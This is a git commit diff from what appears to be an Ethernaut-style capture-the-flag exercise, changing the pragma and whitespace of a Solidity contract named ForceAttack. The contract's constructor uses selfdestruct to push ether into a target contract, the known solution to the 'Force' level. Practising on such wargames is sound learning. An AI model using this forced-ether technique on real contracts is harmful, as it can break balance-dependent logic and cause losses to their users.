f035dd8f9587bd72d25d683ee6cb39dcf3a3c8b7
miield <aodasola95@gmail.com>
2023-03-06 23:59:32 +0100

    Level 7 Force updated

--- Force/attackForce.sol
+++ Force/attackForce.sol
@@ -1,12 +1,14 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity 0.8.0;
 
 import "./force.sol";
 
 contract ForceAttack {
+
     address force;
 
     constructor (address payable _force) payable {
         selfdestruct(_force);
     } 
+
 }
